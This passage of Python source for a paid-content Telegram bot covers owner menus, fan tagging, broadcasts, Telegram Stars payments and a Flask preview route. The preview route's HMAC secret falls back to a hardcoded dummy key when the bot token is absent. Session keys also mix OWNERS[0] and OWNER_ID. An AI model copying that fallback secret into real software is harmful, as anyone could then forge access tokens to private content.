            show_content_management_menu(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "teaser_management_menu":
        if call.from_user.id == OWNER_ID:
            show_teaser_management_menu(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "user_management_menu":
        if call.from_user.id == OWNER_ID:
            show_user_management_menu(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "bot_config_menu":
        if call.from_user.id == OWNER_ID:
            show_bot_config_menu(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    # Helper callbacks for section menus
    elif call.data == "show_delete_content_help":
        if call.from_user.id == OWNER_ID:
            show_delete_content_menu(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "show_delete_teaser_menu":
        if call.from_user.id == OWNER_ID:
            show_delete_teaser_menu(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data.startswith("delete_teaser_"):
        if call.from_user.id == OWNER_ID:
            teaser_id = int(call.data.replace("delete_teaser_", ""))
            # Delete the teaser
            success = delete_teaser(teaser_id)
            
            if success:
                bot.send_message(call.message.chat.id, f"✅ Teaser ID {teaser_id} deleted successfully!")
                # Go back to delete teaser menu
                show_delete_teaser_menu(call.message.chat.id)
            else:
                bot.send_message(call.message.chat.id, f"❌ Teaser ID {teaser_id} not found.")
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "show_set_responses_help":
        if call.from_user.id == OWNER_ID:
            bot.send_message(call.message.chat.id, "✏️ To set AI responses, use: `/owner_set_response [key] [text]`\n\n🔤 Valid keys: greeting, question, compliment, default\n\n💡 Example: `/owner_set_response greeting Hello there! 😊`")
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "show_other_settings_help":
        if call.from_user.id == OWNER_ID:
            bot.send_message(call.message.chat.id, "⚙️ Other available settings:\n\n• `/owner_set_vip_price [stars]` - Set VIP subscription price\n• Use the 💎 VIP Dashboard for VIP settings\n• Most other settings are in the VIP dashboard")
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    # Loyal Fan Management callbacks
    elif call.data == "loyal_fan_management_menu":
        if call.from_user.id == OWNER_ID:
            show_loyal_fan_management_menu(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "mark_loyal_fan":
        if call.from_user.id == OWNER_ID:
            show_mark_loyal_fan_interface(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "list_loyal_fans":
        if call.from_user.id == OWNER_ID:
            show_loyal_fans_list(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "remove_loyal_fan":
        if call.from_user.id == OWNER_ID:
            show_remove_loyal_fan_interface(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data.startswith("select_loyal_"):
        if call.from_user.id == OWNER_ID:
            user_id = int(call.data.replace("select_loyal_", ""))
            # Start reason input session
            upload_sessions[OWNERS[0]] = {
                'type': 'loyal_fan_reason',
                'user_id': user_id,
                'step': 'waiting_for_reason'
            }
            
            # Get user info
            conn = sqlite3.connect('content_bot.db')
            cursor = conn.cursor()
            cursor.execute('SELECT username, first_name FROM users WHERE user_id = ?', (user_id,))
            user_info = cursor.fetchone()
            conn.close()
            
            if user_info:
                username, first_name = user_info
                reason_text = f"""
⭐ <b>MARK AS LOYAL FAN</b> ⭐

👤 <b>Selected User:</b> {first_name} (@{username or 'none'})
🆔 <b>User ID:</b> {user_id}

📝 <b>Please provide a reason for marking this user as loyal:</b>

<b>Examples:</b>
• Big spender - purchased multiple items
• Engaged fan - always interacts with content
• Early supporter - joined when I started
• VIP member - loyal subscriber
• Helpful customer - great feedback

✏️ <b>Type your reason and send:</b>
"""
                
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="loyal_fan_management_menu"))
                
                bot.send_message(call.message.chat.id, reason_text, reply_markup=markup, parse_mode='HTML')
            else:
                bot.send_message(call.message.chat.id, "❌ User not found.")
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data.startswith("confirm_remove_loyal_"):
        if call.from_user.id == OWNER_ID:
            user_id = int(call.data.replace("confirm_remove_loyal_", ""))
            
            # Remove loyal fan status
            conn = sqlite3.connect('content_bot.db')
            cursor = conn.cursor()
            cursor.execute('DELETE FROM loyal_fans WHERE user_id = ?', (user_id,))
            removed_count = cursor.rowcount
            conn.commit()
            conn.close()
            
            if removed_count > 0:
                bot.send_message(call.message.chat.id, "✅ Loyal fan status removed successfully!")
            else:
                bot.send_message(call.message.chat.id, "❌ User was not marked as loyal fan.")
            
            # Go back to loyal fan management
            show_loyal_fan_management_menu(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    # Notification System callbacks
    elif call.data == "notification_management_menu":
        if call.from_user.id == OWNER_ID:
            show_notification_management_menu(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "notify_all_users":
        if call.from_user.id == OWNER_ID:
            show_notification_composer(call.message.chat.id, 'all')
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "notify_vip_users":
        if call.from_user.id == OWNER_ID:
            show_notification_composer(call.message.chat.id, 'vip')
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data == "notify_non_vip_users":
        if call.from_user.id == OWNER_ID:
            show_notification_composer(call.message.chat.id, 'non_vip')
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    elif call.data.startswith("confirm_send_"):
        if call.from_user.id == OWNER_ID:
            target_group = call.data.replace("confirm_send_", "")
            
            # Get stored notification session
            if call.message.chat.id in notification_sessions:
                session = notification_sessions[call.message.chat.id]
                message_text = session.get('message_text')
                users = session.get('users', [])
                
                if message_text and users:
                    # Send the notification
                    target_names = {
                        'all': 'All Users',
                        'vip': 'VIP Members',
                        'non_vip': 'Non-VIP Users'
                    }
                    
                    target_name = target_names.get(target_group, 'Unknown')
                    
                    # Create basic markup for notifications
                    notification_markup = types.InlineKeyboardMarkup()
                    notification_markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
                    
                    # Send notification to users
                    pin_message = target_group == 'vip'  # Pin VIP notifications
                    stats = send_notification_to_users(users, message_text, notification_markup, pin_message)
                    
                    # Send confirmation to owner
                    success_text = f"""
✅ <b>NOTIFICATION SENT SUCCESSFULLY!</b> ✅

🎯 <b>Target Group:</b> {target_name}
✅ <b>Delivered:</b> {stats['sent']} users
❌ <b>Failed:</b> {stats['failed']} users  
🚫 <b>Blocked:</b> {stats['blocked']} users
👥 <b>Total Targeted:</b> {stats['total_targeted']} users

📊 <b>Delivery Rate:</b> {(stats['sent'] / max(stats['total_targeted'], 1) * 100):.1f}%

💡 <b>Message sent:</b> {message_text[:100]}{'...' if len(message_text) > 100 else ''}
"""
                    
                    markup = types.InlineKeyboardMarkup()
                    markup.add(types.InlineKeyboardButton("📢 Send Another Notification", callback_data="notification_management_menu"))
                    markup.add(types.InlineKeyboardButton("🔙 Back to Owner Help", callback_data="owner_help"))
                    
                    bot.send_message(call.message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')
                    
                    # Clear the session
                    del notification_sessions[call.message.chat.id]
                else:
                    bot.send_message(call.message.chat.id, "❌ Notification session expired. Please try again.")
            else:
                bot.send_message(call.message.chat.id, "❌ No active notification session found.")
        else:
            bot.send_message(call.message.chat.id, "❌ Access denied. This is an owner-only command.")
    
    # Answer callback to remove loading state
    bot.answer_callback_query(call.id)

# Payment handlers

@bot.pre_checkout_query_handler(func=lambda query: True)
def pre_checkout_handler(pre_checkout_query):
    """Handle pre-checkout queries for Telegram Stars payments"""
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@bot.message_handler(content_types=['successful_payment'])
def successful_payment_handler(message):
    """Handle successful payment and deliver content"""
    payment = message.successful_payment
    
    # Parse payload to get content info
    payload_parts = payment.invoice_payload.split('_')
    
    # Handle VIP subscription payments
    if len(payload_parts) >= 2 and payload_parts[0] == 'vip' and payload_parts[1] == 'subscription':
        user_id = int(payload_parts[2])
        
        # Update user's total spent
        conn = sqlite3.connect('content_bot.db')
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET total_stars_spent = total_stars_spent + ? WHERE user_id = ?', 
                      (payment.total_amount, user_id))
        conn.commit()
        conn.close()
        
        # Activate VIP subscription
        duration_days = activate_vip_subscription(user_id)
        
        # Send confirmation message
        vip_welcome_message = f"""
💎 **VIP SUBSCRIPTION ACTIVATED!** 💎

🎉 Congrats, you’re officially a VIP now!
⏰ **Duration:** {duration_days} days
💰 **Amount:** {payment.total_amount} Stars

🌟 **Your VIP Benefits Are Now Active:**
• Unlimited access to all exclusive content
• Direct personal chat with me
• Priority responses to all messages
• Special VIP-only teasers and previews
• Monthly exclusive photo sets
• Behind-the-scenes content

💫 Welcome to the VIP family, baby! You’re not just amazing, you’re everything ✨

Use the buttons below to explore your new VIP privileges:
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛒 Browse All Content", callback_data="browse_content"))
        markup.add(types.InlineKeyboardButton("🎬 VIP Exclusive Teasers", callback_data="teasers"))
        markup.add(types.InlineKeyboardButton("🏠 Back to Main", callback_data="cmd_start"))
        
        bot.send_message(message.chat.id, vip_welcome_message, reply_markup=markup, parse_mode='Markdown')
        
        # Notify owner of new VIP subscription
        try:
            # Format date as requested
            today = datetime.datetime.now()
            formatted_date = today.strftime("%b %d").upper()
            
            # Create enhanced notification with clickable name
            owner_notification = f"""
💎 **NEW VIP SUBSCRIPTION!** 💎

👤 [{message.from_user.first_name}](tg://user?id={user_id})
🆔 User ID: {user_id}
📅 Date: {formatted_date}
💰 Amount: {payment.total_amount} Stars
⏰ Duration: {duration_days} days

💬 Click the name to message them directly!
"""
            bot.send_message(OWNER_ID, owner_notification, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Error sending owner notification: {e}")
            # Fallback notification
            try:
                bot.send_message(OWNER_ID, f"💎 NEW VIP SUBSCRIPTION!\n👤 {message.from_user.first_name}\n💰 {payment.total_amount} Stars\n🆔 ID: {user_id}")
            except:
                pass
            
    elif len(payload_parts) >= 3 and payload_parts[0] == 'content':
        content_name = payload_parts[1]
        user_id = int(payload_parts[2])
        
        # Update user's total spent
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET total_stars_spent = total_stars_spent + ? WHERE user_id = ?', 
                      (payment.total_amount, user_id))
        
        # Record the purchase for permanent access (use INSERT OR IGNORE to prevent duplicates)
        purchase_date = datetime.datetime.now().isoformat()
        cursor.execute('''
            INSERT OR IGNORE INTO user_purchases (user_id, content_name, purchase_date, price_paid)
            VALUES (?, ?, ?, ?)
        ''', (user_id, content_name, purchase_date, payment.total_amount))
        
        # Get content details
        cursor.execute('SELECT file_path, description FROM content_items WHERE name = ?', (content_name,))
        content = cursor.fetchone()
        conn.commit()
        conn.close()
        
        if content:
            file_path, description = content
            
            # Send content to user
            thank_you_message = f"""
🎉 **PAYMENT SUCCESSFUL!** 🎉

Thank you for your purchase! Here's your exclusive content:

**{content_name}**
{description}

💕 You’re absolutely amazing for supporting me, babe! Now sit back, relax, and enjoy the content made just for YOU.
"""
            
            bot.send_message(message.chat.id, thank_you_message, parse_mode='Markdown')
            
            # Send the actual content (photo/video/document)
            try:
                if file_path.startswith('http'):
                    # It's a URL
                    if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):
                        bot.send_photo(message.chat.id, file_path, caption=f"🎁 {content_name}")
                    elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):
                        bot.send_video(message.chat.id, file_path, caption=f"🎁 {content_name}")
                    else:
                        bot.send_document(message.chat.id, file_path, caption=f"🎁 {content_name}")
                elif len(file_path) > 50 and not file_path.startswith('/'):
                    # It's a Telegram file_id (file_ids are long strings)
                    try:
                        # Try to send as photo first (most common)
                        bot.send_photo(message.chat.id, file_path, caption=f"🎁 {content_name}")
                    except:
                        try:
                            # Try as video
                            bot.send_video(message.chat.id, file_path, caption=f"🎁 {content_name}")
                        except:
                            try:
                                # Try as document
                                bot.send_document(message.chat.id, file_path, caption=f"🎁 {content_name}")
                            except:
                                # Last resort - show file_id
                                bot.send_message(message.chat.id, f"🎁 Your content: {content_name}\n\nFile ID: {file_path}\n\n⚠️ If you have trouble accessing this content, please contact me!")
                else:
                    # It's a local file path
                    with open(file_path, 'rb') as file:
                        if any(ext in file_path.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif']):
                            bot.send_photo(message.chat.id, file, caption=f"🎁 {content_name}")
                        elif any(ext in file_path.lower() for ext in ['.mp4', '.mov', '.avi']):
                            bot.send_video(message.chat.id, file, caption=f"🎁 {content_name}")
                        else:
                            bot.send_document(message.chat.id, file, caption=f"🎁 {content_name}")
            except Exception as e:
                bot.send_message(message.chat.id, f"🎁 Your content: {content_name}\n\n⚠️ There was an issue delivering your content. Please contact me and I'll send it manually!")
                logger.error(f"Error sending content {content_name}: {e}")
            
            # Notify owner of sale
            try:
                user_data = get_user_data(user_id)
                if user_data:
                    username = user_data[1] or "none"
                    first_name = user_data[2] or "N/A"
                    total_spent = user_data[4]  # Don't add payment.total_amount again - it's already updated in DB
                    
                    bot.send_message(OWNER_ID, f"""
💰 **NEW SALE!** 💰

👤 [{first_name}](tg://user?id={user_id})
🛒 Item: {content_name}
⭐ Amount: {payment.total_amount} Stars
💎 Total Spent: {total_spent} Stars
🆔 User ID: {user_id}

💬 Click the name to message them directly!
""", parse_mode='Markdown')
            except Exception as e:
                logger.error(f"Error notifying owner: {e}")

# Notification message handler (must be before general text handler for priority)

@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and message.chat.id in notification_sessions and notification_sessions[message.chat.id].get('waiting_for_message'))
def handle_notification_message_input(message):
    """Handle notification message input from owner"""
    session = notification_sessions[message.chat.id]
    target_group = session['target_group']
    users = session['users']
    notification_text = message.text
    
    if len(notification_text) < 1 or len(notification_text) > 4000:
        bot.send_message(message.chat.id, "❌ Message must be between 1 and 4000 characters. Please try again:")
        return
    
    # Confirm before sending
    target_names = {
        'all': 'All Users',
        'vip': 'VIP Members', 
        'non_vip': 'Non-VIP Users'
    }
    
    target_name = target_names.get(target_group, 'Unknown')
    user_count = len(users)
    
    # Show preview and confirmation
    preview_text = f"""
📢 <b>NOTIFICATION PREVIEW</b> 📢

🎯 <b>Target:</b> {target_name} ({user_count} users)

📝 <b>Message Preview:</b>
{notification_text}

⚠️ <b>Ready to send?</b> This will notify {user_count} users immediately!
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Send Notification", callback_data=f"confirm_send_{target_group}"))
    markup.add(types.InlineKeyboardButton("✏️ Edit Message", callback_data=f"notify_{target_group}_users"))
    markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="notification_management_menu"))
    
    bot.send_message(message.chat.id, preview_text, reply_markup=markup, parse_mode='HTML')
    
    # Store the message for confirmation
    notification_sessions[message.chat.id]['message_text'] = notification_text
    notification_sessions[message.chat.id]['waiting_for_message'] = False

# Natural text message handler

@bot.message_handler(content_types=['text'])
def handle_text_messages(message):
    """Handle natural text messages with AI-style responses"""
    # Skip if it's a command
    if message.text.startswith('/'):
        return
    
    add_or_update_user(message.from_user)
    
    # Get AI-style response
    response = get_ai_response(message.text)
    
    # Add inline keyboard for engagement
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🎬 View Teasers", callback_data="teasers"))
    markup.add(types.InlineKeyboardButton("🛒 Browse Content", callback_data="browse_content"))
    
    bot.send_message(message.chat.id, response, reply_markup=markup)

# Security functions for owner-only access control

def generate_secure_access_token(content_name):
    """Generate secure HMAC-based access token for content preview"""
    import hashlib
    import hmac
    
    # Use bot token as secret key - only owner knows this
    # Handle case where BOT_TOKEN might be None or dummy
    token_key = BOT_TOKEN or "dummy_key_for_web_mode"
    secret_key = token_key.encode('utf-8')
    
    # Create message including content name and a fixed salt
    message = f"content_preview:{content_name}:owner_access".encode('utf-8')
    
    # Generate HMAC-SHA256 token
    token = hmac.new(secret_key, message, hashlib.sha256).hexdigest()
    
    return token

def generate_owner_access_url(content_name):
    """Generate secure access URL for owner to preview content"""
    token = generate_secure_access_token(content_name)
    # Get the domain from environment or use default for development
    domain = os.environ.get('REPL_SLUG', 'localhost:5000')
    
    return f"https://{domain}/content/preview/{content_name}?token={token}"

# Flask routes for Replit hosting

# Basic routes removed - replaced with more comprehensive routes below

@app.route('/content/preview/<content_name>')
def preview_content(content_name):
    """Serve content preview by content name - OWNER ONLY ACCESS"""
    from flask import send_file, redirect, abort, Response, request
    import io
    import hashlib
    import hmac
    
    # SECURITY: Owner-only access control
    # Check for access token in query parameters or headers
    access_token = request.args.get('token') or request.headers.get('X-Access-Token')
    
    if not access_token:
        logger.warning(f"Unauthorized access attempt to content '{content_name}' from {request.remote_addr}")
        abort(403, "Access denied: Authentication required")
    
    # Validate access token using bot token as secret key
    # This ensures only someone who knows the bot token can generate valid access tokens
    expected_token = generate_secure_access_token(content_name)
    
    if not hmac.compare_digest(access_token, expected_token):
        logger.warning(f"Invalid access token for content '{content_name}' from {request.remote_addr}")
        abort(403, "Access denied: Invalid authentication token")
    
    try:
        # Get content details from database
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT file_path, description, content_type FROM content_items WHERE name = ?', (content_name,))
        content = cursor.fetchone()
        conn.close()
        
        if not content:
            abort(404, f"Content '{content_name}' not found")
        
        file_path, description, content_type = content
        
        logger.info(f"Authorized access to content '{content_name}' from {request.remote_addr}")
        return serve_content_file(file_path, content_name, description)
        
    except Exception as e:
        logger.error(f"Error serving content preview {content_name}: {e}")
        abort(500, f"Error serving content: {str(e)}")

# REMOVED: Dangerous /content/file/<file_id> endpoint that acted as open Telegram proxy

def serve_content_file(file_path, content_name="Content", description=""):
    """Secure helper function to serve content files from various sources"""
    from flask import send_file, redirect, abort, Response
    import os.path
    import re
    import io
    
    # Maximum file size for Telegram downloads (50MB)
    MAX_TELEGRAM_FILE_SIZE = 50 * 1024 * 1024
    
    # Allowed content types for security
    ALLOWED_CONTENT_TYPES = {
        'jpg': 'image/jpeg', 'jpeg': 'image/jpeg',
        'png': 'image/png', 'gif': 'image/gif',
        'webp': 'image/webp', 'bmp': 'image/bmp',
        'mp4': 'video/mp4', 'mov': 'video/quicktime',
        'avi': 'video/x-msvideo', 'webm': 'video/webm',
        'mkv': 'video/x-matroska'
    }
    
    def is_telegram_file_id(file_path):
        """Securely detect Telegram file IDs using proper validation"""
        # Telegram file IDs are alphanumeric + hyphens/underscores, typically 20-100 chars
        if not isinstance(file_path, str) or len(file_path) < 20 or len(file_path) > 200:
            return False
        # Must not be a path (no slashes) and must match Telegram file ID pattern
        return '/' not in file_path and re.match(r'^[A-Za-z0-9_-]+$', file_path) is not None
    
    def secure_local_file_path(file_path):
        """Secure local file path resolution with path traversal protection"""
        # Define allowed directories for content files
        allowed_dirs = ['uploads', 'content', 'static', 'media']
        
        # Normalize the path to prevent traversal attacks
        try:
            # Remove any potential path traversal attempts
            normalized_path = os.path.normpath(file_path)
            
            # Ensure the path doesn't try to go up directories
            if '..' in normalized_path or normalized_path.startswith('/'):
                return None
                
            # Check if path starts with an allowed directory
            path_parts = normalized_path.split(os.sep)
            if not path_parts or path_parts[0] not in allowed_dirs:
                return None
                
            # Construct secure absolute path
            secure_path = os.path.join(os.getcwd(), normalized_path)
            
            # Final security check: ensure resolved path is within allowed directories
            resolved_path = os.path.realpath(secure_path)
            base_dir = os.path.realpath(os.getcwd())
            
            if not resolved_path.startswith(base_dir):
                return None
                
            return secure_path
            
        except (ValueError, OSError) as e:
            logger.error(f"Path security validation failed: {e}")
            return None
    
    try:
        if file_path.startswith(('http://', 'https://')):
            # External URL - validate and redirect
            # Basic URL validation to prevent malicious redirects
            if not re.match(r'^https?://[a-zA-Z0-9.-]+/.*', file_path):
                abort(400, "Invalid external URL format")
            return redirect(file_path)
            
        elif is_telegram_file_id(file_path):
            # Secure Telegram file handling
            try:
                file_info = bot.get_file(file_path)
                
                # Check file size limit
                if hasattr(file_info, 'file_size') and file_info.file_size is not None and file_info.file_size > MAX_TELEGRAM_FILE_SIZE:
                    abort(413, f"File too large: {file_info.file_size} bytes (max: {MAX_TELEGRAM_FILE_SIZE})")
                
                # Validate file type
                file_extension = ''
                if file_info.file_path and '.' in file_info.file_path:
                    file_extension = file_info.file_path.split('.')[-1].lower()
                    if file_extension not in ALLOWED_CONTENT_TYPES:
                        abort(415, f"Unsupported file type: {file_extension}")
                
                # Construct secure Telegram URL
                file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
                
                # Stream download with size limit enforcement
                with requests.get(file_url, timeout=30, stream=True) as response:
                    response.raise_for_status()
                    
                    # Check Content-Length header for size validation
                    content_length = response.headers.get('Content-Length')
                    if content_length and int(content_length) > MAX_TELEGRAM_FILE_SIZE:
                        abort(413, f"File too large: {content_length} bytes")
                    
                    # Stream file content with size checking
                    file_content = io.BytesIO()
                    downloaded_size = 0
                    
                    for chunk in response.iter_content(chunk_size=8192):
                        if chunk:
                            downloaded_size += len(chunk)
                            if downloaded_size > MAX_TELEGRAM_FILE_SIZE:
                                abort(413, "File size limit exceeded during download")
                            file_content.write(chunk)
                    
                    file_content.seek(0)
                    
                    # Determine secure content type
                    content_type = ALLOWED_CONTENT_TYPES.get(file_extension, 'application/octet-stream')
                    
                    # Security headers
                    secure_headers = {
                        'Content-Disposition': f'inline; filename="{re.sub(r"[^a-zA-Z0-9._-]", "_", content_name)}.{file_extension}"',
                        'Cache-Control': 'no-cache, no-store, must-revalidate',
                        'Pragma': 'no-cache',
                        'Expires': '0',
                        'X-Content-Type-Options': 'nosniff',
                        'Content-Security-Policy': "default-src 'none'; img-src 'self'; media-src 'self'"
                    }
                    
                    return Response(
                        file_content.getvalue(),
                        mimetype=content_type,
                        headers=secure_headers
                    )
                
            except requests.exceptions.RequestException as e:
                logger.error(f"Error downloading from Telegram: {e}")
                abort(502, "Unable to retrieve file from Telegram")
            except Exception as e:
                logger.error(f"Telegram file processing error: {e}")
                abort(500, "File processing error")
                
        else:
            # Secure local file serving with path traversal protection
            secure_path = secure_local_file_path(file_path)
            if not secure_path:
                abort(403, "Access to this file path is not allowed")
                
            try:
                # Additional security: check file exists and is readable
                if not os.path.isfile(secure_path):
                    abort(404, "File not found")
                    
                # Validate file extension for local files too
                file_ext = ''
                if '.' in secure_path:
                    file_ext = secure_path.split('.')[-1].lower()
                    if file_ext not in ALLOWED_CONTENT_TYPES:
                        abort(415, f"Unsupported local file type: {file_ext}")
                
                # Apply security headers to local file serving as well
                response = send_file(secure_path, as_attachment=False, conditional=True)
                
                # Add security headers
                response.headers['X-Content-Type-Options'] = 'nosniff'
                response.headers['Content-Security-Policy'] = "default-src 'none'; img-src 'self'; media-src 'self'"
                response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
                response.headers['Pragma'] = 'no-cache'
                response.headers['Expires'] = '0'
                
                return response
                
            except FileNotFoundError:
                abort(404, "Local file not found")
            except PermissionError:
                abort(403, "Permission denied")
            except Exception as e:
                logger.error(f"Local file serving error: {e}")
                abort(500, "Error serving local file")
                
    except Exception as e:
        logger.error(f"Error in serve_content_file: {e}")
        abort(500, "File serving error")

# Message handlers for special interactive flows

@bot.message_handler(func=lambda message: message.from_user.id == OWNER_ID and OWNER_ID in upload_sessions and upload_sessions[OWNER_ID].get('type') == 'loyal_fan_reason')
def handle_loyal_fan_reason_input(message):
    """Handle loyal fan reason input from owner"""
    if upload_sessions[OWNER_ID].get('step') == 'waiting_for_reason':
        reason = message.text.strip()
        user_id = upload_sessions[OWNER_ID].get('user_id')
        
        if len(reason) < 3 or len(reason) > 200:
            bot.send_message(message.chat.id, "❌ Reason must be between 3 and 200 characters. Please try again:")
            return
        
        # Mark user as loyal fan
        conn = sqlite3.connect('content_bot.db')
        cursor = conn.cursor()
        
        # Check if user exists
        cursor.execute('SELECT first_name, username FROM users WHERE user_id = ?', (user_id,))
        user_info = cursor.fetchone()
        
        if user_info:
            first_name, username = user_info
            
            # Insert loyal fan record
            now = datetime.datetime.now().isoformat()
            cursor.execute('INSERT OR REPLACE INTO loyal_fans (user_id, reason, date_marked) VALUES (?, ?, ?)', 
                         (user_id, reason, now))
            conn.commit()
            
            success_text = f"""
✅ <b>LOYAL FAN MARKED SUCCESSFULLY!</b> ✅

👤 <b>User:</b> {first_name} (@{username or 'none'})
📝 <b>Reason:</b> {reason}
📅 <b>Date:</b> {datetime.datetime.now().strftime("%b %d, %Y")}

⭐ This user will now show as "LOYAL" in your user analytics and listings!

💡 <b>Benefits of marking loyal fans:</b>
• Easy identification in user lists
• Track your most valuable customers  
• Quick recognition of top supporters
"""
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("⭐ Mark Another Fan", callback_data="mark_loyal_fan"))
            markup.add(types.InlineKeyboardButton("📋 View All Loyal Fans", callback_data="list_loyal_fans"))
            markup.add(types.InlineKeyboardButton("🔙 Back to Management", callback_data="loyal_fan_management_menu"))
            
            bot.send_message(message.chat.id, success_text, reply_markup=markup, parse_mode='HTML')
        else:
            bot.send_message(message.chat.id, "❌ User not found in database.")
        
        conn.close()
        
        # Clear the session
        if OWNERS[0] in upload_sessions:
            del upload_sessions[OWNERS[0]]

def clear_webhook_and_polling():
    """Clear any existing webhook and stop other polling instances"""
    try:
        logger.info("Clearing any existing webhook...")
        # Clear webhook to stop webhook mode and drop pending updates
        bot.remove_webhook()
        logger.info("Webhook cleared successfully with pending updates dropped")
        
        # Short delay to ensure cleanup
        import time
        time.sleep(3)
        
    except Exception as e:
        logger.warning(f"Error clearing webhook (this is usually fine): {e}")

def run_bot():
    """Run the bot with infinity polling and better error handling"""
    import time
    
    # First, clear any existing webhook to prevent conflicts
    clear_webhook_and_polling()
    
    max_retries = 5
    retry_delay = 5  # seconds
    
    for attempt in range(max_retries):
        try:
            logger.info(f"Starting bot polling (attempt {attempt + 1}/{max_retries})...")
            
            # Clear webhook again right before polling starts
            if attempt > 0:  # On retries, try clearing webhook again
                try:
                    bot.remove_webhook()
                    time.sleep(1)
                except:
                    pass
            
            bot.infinity_polling(
                none_stop=True,
                timeout=30,  # 30 second timeout for requests
                skip_pending=True  # Skip pending messages on restart
            )
            logger.info("Bot polling started successfully!")
            break  # If we reach here, polling started successfully
            
        except Exception as e:
            error_str = str(e)
            logger.error(f"Bot polling failed (attempt {attempt + 1}/{max_retries}): {error_str}")
            
            # Special handling for 409 conflicts
            if "409" in error_str and "getUpdates" in error_str:
                logger.info("Detected getUpdates conflict, waiting longer before retry...")
                if attempt < max_retries - 1:
                    longer_delay = retry_delay * 2
                    logger.info(f"Waiting {longer_delay} seconds for other instances to timeout...")
                    time.sleep(longer_delay)
            
            if attempt < max_retries - 1:
                logger.info(f"Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
                retry_delay *= 2  # Exponential backoff
            else:
                logger.error("Max retries reached. Bot polling could not be started.")
                logger.info("Flask server will continue running for health checks.")
                # Don't exit, let Flask continue running for health checks
                break

# Flask Routes
@app.route('/')
def home():
    """Home page with bot status"""
    original_bot_token = os.getenv('BOT_TOKEN')
    original_owner_id = int(os.getenv('OWNER_ID', '0'))
    
    bot_status = "Active" if original_bot_token and original_owner_id != 0 else "Web-only mode"
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Content Creator Bot</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
            .container {{ max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            h1 {{ color: #333; text-align: center; }}
            .status {{ padding: 15px; border-radius: 5px; margin: 20px 0; }}
            .active {{ background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }}
            .web-only {{ background: #fff3cd; color: #856404; border: 1px solid #ffeaa7; }}
            .info {{ margin: 20px 0; padding: 15px; background: #e7f3ff; border-radius: 5px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🤖 Content Creator Bot</h1>
            <div class="status {'active' if bot_status == 'Active' else 'web-only'}">
                <strong>Status:</strong> {bot_status}
            </div>
            <div class="info">
                <h3>📊 System Information</h3>
                <p><strong>Database:</strong> PostgreSQL (Connected)</p>
                <p><strong>Web Server:</strong> Running on port 5000</p>
                <p><strong>Bot Mode:</strong> {bot_status}</p>
            </div>
            {'''<div class="info">
                <h3>⚙️ Setup Required</h3>
                <p>To enable full Telegram bot functionality:</p>
                <ol>
                    <li>Get a bot token from @BotFather on Telegram</li>
                    <li>Get your user ID from @userinfobot on Telegram</li>
                    <li>Add BOT_TOKEN and OWNER_ID to Replit Secrets</li>
                    <li>Restart the application</li>
                </ol>
            </div>''' if bot_status == 'Web-only mode' else ''}
        </div>
    </body>
    </html>
    """
    return html

@app.route('/health')
def health():
    """Health check endpoint"""
    try:
        # Test database connection
